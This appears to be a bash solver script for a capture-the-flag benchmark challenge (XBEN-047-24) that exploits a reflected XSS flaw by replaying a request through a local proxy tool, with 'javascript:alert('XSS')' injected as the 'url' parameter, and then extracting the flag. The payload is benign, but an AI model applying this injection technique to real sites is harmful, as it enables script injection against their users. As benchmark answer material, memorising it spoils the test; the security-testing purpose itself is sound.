#!/usr/bin/env bash
# XBEN-047-24 — reflected XSS. Proxy-mode twin of examples/xben/xben-047-xss-javascript-iframe-src.sh. The
# target validates the submitted payload server-side and returns the flag when
# it would execute, so the attack is one replayed request carrying the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben-047-xss-javascript-iframe-srcp-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set method=GET --set path=/page \
  --set query.url='javascript:alert('\''XSS'\'')' \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
